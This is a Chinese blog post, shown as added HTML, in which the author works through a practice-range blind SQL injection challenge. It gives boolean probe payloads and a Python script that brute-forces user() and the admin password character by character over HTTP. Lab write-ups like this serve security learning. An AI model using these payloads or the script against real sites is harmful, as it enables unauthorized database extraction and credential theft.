@@ -1,0 +1,227 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>记一次用Python挑战SQL注入 - Nero</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Nero,"> 
+    <meta name="description" content="前言
+最近哥们给我分享了一个靶场地址，疫情在家闲着无聊便拿来挑战一下。
+
+靶场地址
+分析
+可以看到，题目要求是拿到管理员密码即可。
+
+再进入靶机页面瞅瞅，看来就是要在url上操作了
+
+简单加一个an,"> 
+    <meta name="author" content="Nero"> 
+    <link rel="alternative" href="atom.xml" title="Nero" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Nero</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">记一次用Python挑战SQL注入</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">记一次用Python挑战SQL注入</h1>
+        <div class="stuff">
+            <span>四月 13, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li><p>最近哥们给我分享了一个靶场地址，疫情在家闲着无聊便拿来挑战一下。</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://hack.zkaq.cn/">靶场地址</a></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2></li>
+<li><p>可以看到，题目要求是拿到管理员密码即可。<br><img src="https://img-blog.csdnimg.cn/20200413171506664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+<li><p>再进入靶机页面瞅瞅，看来就是要在url上操作了<br><img src="https://img-blog.csdnimg.cn/20200413171823314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+<li><p>简单加一个and 1=1和and 1=2，发现1=1时，显示下面的猫舍介绍，1=2时，不显示猫舍介绍。这个变化就作为分辨依据。<br><img src="https://img-blog.csdnimg.cn/20200413174244815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+</ul>
+<h2 id="开始挑战"><a href="#开始挑战" class="headerlink" title="开始挑战"></a>开始挑战</h2><h3 id="先拿一手user-（此时我已经忘记题目要求要拿管理员密码。。。。。）"><a href="#先拿一手user-（此时我已经忘记题目要求要拿管理员密码。。。。。）" class="headerlink" title="先拿一手user()（此时我已经忘记题目要求要拿管理员密码。。。。。）"></a>先拿一手user()（此时我已经忘记题目要求要拿管理员密码。。。。。）</h3><h5 id="先拿user-长度"><a href="#先拿user-长度" class="headerlink" title="先拿user()长度"></a>先拿user()长度</h5><ul>
+<li>先and char_length(user())&gt;0，OK</li>
+<li>再and char_length(user()&gt;100),ERROR</li>
+<li>。。。。。。（中间省略，自己慢慢试）</li>
+<li>就这样把user()的长度试了出来，16。<h5 id="长度出来，试字段"><a href="#长度出来，试字段" class="headerlink" title="长度出来，试字段"></a>长度出来，试字段</h5></li>
+<li>用and ASCII(mid(user(),1,1))&gt;0，试出来后查表转换为字符</li>
+<li>然后我们用python（不要问我为啥突然用python，试了8个字符后，手都试酸了。。。T0T）</li>
+<li>上代码（代码不能直接用啊，自己简单分析一下，根据自己要获取的内容改一下，再补全IP就能用了）</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re,requests</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line">string = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>):	<span class="comment">#循环第几个字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):	<span class="comment">#从ASCII码表的第几到几开始试，试全部可能会慢很多</span></span><br><span class="line">        <span class="comment">#url = &#x27;http://117.167.*.*:10180/index.php?id=1%20and%20(select%20ascii(mid(password,&#x27;+str(j)+&#x27;,1))%20from%20admin)=&#x27;+str(i) #找password时候用的</span></span><br><span class="line">        <span class="comment">#url = &#x27;http://117.167.*.*:10180/index.php?id=1&#x27;+&#x27;and ASCII(mid(1,1))=&#x27;+str(i)</span></span><br><span class="line">        url = <span class="string">&#x27;http://117.167.*.*:10180/index.php?id=1%20and%20ASCII(mid(user(),&#x27;</span>+str(j)+<span class="string">&#x27;,1))=&#x27;</span>+str(i)</span><br><span class="line">        res = requests.get(url)</span><br><span class="line">        res.encoding = <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;猫舍介绍&quot;</span> <span class="keyword">in</span> res.text):<span class="comment">#判断返回的是OK还是ERROR</span></span><br><span class="line">            print(str(j)+<span class="string">&#x27;是&#x27;</span>+str(i))</span><br><span class="line">            result.append(str(j)+<span class="string">&#x27;:&#x27;</span>+str(i))</span><br><span class="line">            string.append(str(j)+<span class="string">&#x27;:&#x27;</span>+chr(i)) <span class="comment">#将得到的编码自动转换成字符</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;不是&#x27;</span>+str(i))</span><br><span class="line"></span><br><span class="line">print(result)</span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>程序运行完之后记得查看输出结果是否有没试出来的字符，可以换个区间重新试一下或者自己手动试。</li>
+</ul>
+<h3 id="同理再拿一手database"><a href="#同理再拿一手database" class="headerlink" title="同理再拿一手database()"></a>同理再拿一手database()</h3><ul>
+<li>maoshe<h3 id="再拿一手version"><a href="#再拿一手version" class="headerlink" title="再拿一手version()"></a>再拿一手version()</h3></li>
+<li>5.5.53<h3 id="再拿一手hostname"><a href="#再拿一手hostname" class="headerlink" title="再拿一手hostname"></a>再拿一手hostname</h3></li>
+<li>gongksik_d45fb6<h3 id="再拿一手。。。。。。"><a href="#再拿一手。。。。。。" class="headerlink" title="再拿一手。。。。。。"></a>再拿一手。。。。。。</h3><h3 id="哎，我到底要拿啥来着，哦对，管理员密码"><a href="#哎，我到底要拿啥来着，哦对，管理员密码" class="headerlink" title="哎，我到底要拿啥来着，哦对，管理员密码"></a>哎，我到底要拿啥来着，哦对，管理员密码</h3><h4 id="先找表"><a href="#先找表" class="headerlink" title="先找表"></a>先找表</h4></li>
+<li>先随便试一下有没有admin表，and (select count(*) from admin)&gt;0，Woc！！！还真有！</li>
+<li>再随便试一下有没有password字段，and(select count(password) from admin)&gt;0，Woc！！！又有！</li>
+<li>这里博主走了点狗屎运，读者请勿模仿，自行一个个猜哈~</li>
+<li>接下来就简单了，用上上面的python代码</li>
+<li>注入标记改为(select ASSII(mid(password,1,1)))&gt;0</li>
+<li>然后就得到了管理员密码——（自己试去，┑(￣▽ ￣)┍）<h3 id="接下来最重要的步骤——登录MySQL系统"><a href="#接下来最重要的步骤——登录MySQL系统" class="headerlink" title="接下来最重要的步骤——登录MySQL系统"></a>接下来最重要的步骤——登录MySQL系统</h3></li>
+<li>等好久都不成功，才想起我们的目标只是拿到管理员密码。。。。。<br><img src="https://img-blog.csdnimg.cn/20200413180149362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2></li>
+<li>本次SQL注入到此结束，还愣着干啥，点赞关注走一走啊。。。。（￣︶￣）↗</li>
+</ul>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='https://link.hhtjim.com/qq/001faIUs4M2zna.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://music.xf1433.com/up/view.php/9afe0c372d5dd4641033e61ae0fa82de.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%8C%91%E6%88%98"><span class="toc-number">3.</span> <span class="toc-text">开始挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E6%8B%BF%E4%B8%80%E6%89%8Buser-%EF%BC%88%E6%AD%A4%E6%97%B6%E6%88%91%E5%B7%B2%E7%BB%8F%E5%BF%98%E8%AE%B0%E9%A2%98%E7%9B%AE%E8%A6%81%E6%B1%82%E8%A6%81%E6%8B%BF%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">先拿一手user()（此时我已经忘记题目要求要拿管理员密码。。。。。）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%88%E6%8B%BFuser-%E9%95%BF%E5%BA%A6"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">先拿user()长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E5%87%BA%E6%9D%A5%EF%BC%8C%E8%AF%95%E5%AD%97%E6%AE%B5"><span class="toc-number">3.1.0.2.</span> <span class="toc-text">长度出来，试字段</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E7%90%86%E5%86%8D%E6%8B%BF%E4%B8%80%E6%89%8Bdatabase"><span class="toc-number">3.2.</span> <span class="toc-text">同理再拿一手database()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%8B%BF%E4%B8%80%E6%89%8Bversion"><span class="toc-number">3.3.</span> <span class="toc-text">再拿一手version()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%8B%BF%E4%B8%80%E6%89%8Bhostname"><span class="toc-number">3.4.</span> <span class="toc-text">再拿一手hostname</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%8B%BF%E4%B8%80%E6%89%8B%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82"><span class="toc-number">3.5.</span> <span class="toc-text">再拿一手。。。。。。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%8E%EF%BC%8C%E6%88%91%E5%88%B0%E5%BA%95%E8%A6%81%E6%8B%BF%E5%95%A5%E6%9D%A5%E7%9D%80%EF%BC%8C%E5%93%A6%E5%AF%B9%EF%BC%8C%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81"><span class="toc-number">3.6.</span> <span class="toc-text">哎，我到底要拿啥来着，哦对，管理员密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E6%89%BE%E8%A1%A8"><span class="toc-number">3.6.1.</span> <span class="toc-text">先找表</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84%E6%AD%A5%E9%AA%A4%E2%80%94%E2%80%94%E7%99%BB%E5%BD%95MySQL%E7%B3%BB%E7%BB%9F"><span class="toc-number">3.7.</span> <span class="toc-text">接下来最重要的步骤——登录MySQL系统</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">4.</span> <span class="toc-text">后记</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
